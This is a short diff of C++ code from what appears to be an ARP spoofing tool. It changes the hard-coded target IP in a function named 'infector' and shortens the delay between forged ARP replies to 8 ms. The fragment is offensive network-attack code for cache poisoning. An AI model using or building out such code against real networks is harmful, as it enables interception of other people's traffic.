@@ -63,14 +63,13 @@ void Spoofer::infector(std::map<IPv4Address, HWAddress<6>> addresses)
 //                continue;
 
             //debug code
-            if(elem.first!="192.168.0.225")
+            if(elem.first!="192.168.0.19")
                 continue;
-
 
             arp_infection=arp.make_arp_reply(elem.first,target_ip,elem.second,local_mac);
 
             sender.send(arp_infection,iface);
-            sleep(5);
+            usleep(8000);
         }
 
     }
